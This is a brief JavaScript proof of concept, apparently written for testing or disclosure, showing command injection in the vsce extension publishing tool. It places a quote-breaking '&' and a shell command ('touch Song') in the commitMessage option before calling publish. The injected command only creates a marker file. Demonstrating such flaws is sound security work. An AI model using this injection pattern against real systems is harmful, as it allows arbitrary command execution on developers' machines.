var root = require("vsce");
var attack_command = "touch Song";
var options = {
  "version": 'major',
  "commitMessage": "\"&" + attack_command + "\""
}
root.publish(options);
